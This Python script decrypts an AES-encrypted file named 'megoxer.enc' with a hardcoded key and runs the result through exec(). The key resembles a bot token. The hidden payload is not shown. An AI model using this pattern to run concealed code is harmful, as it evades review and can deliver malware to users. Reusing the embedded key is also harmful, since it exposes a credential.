import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = base64.b64decode("7302230202:AAEbdLNMabuZ4-zwNUbrA2wnaFZEWXgtP-s=")

def aes_decrypt(data, key):
    raw_data = base64.b64decode(data)
    iv, encrypted = raw_data[:16], raw_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted)
    try:
        return unpad(decrypted_padded, AES.block_size).decode()
    except ValueError as e:
        print(f"Padding error: {e}")
        return None

def load_encrypted_script(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as enc_file:
            return enc_file.read()
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def main():
    encrypted_script = load_encrypted_script("megoxer.enc")
    if encrypted_script is not None:
        decrypted_script = aes_decrypt(encrypted_script, KEY)
        if decrypted_script:
            exec(decrypted_script)

if __name__ == "__main__":
    main()
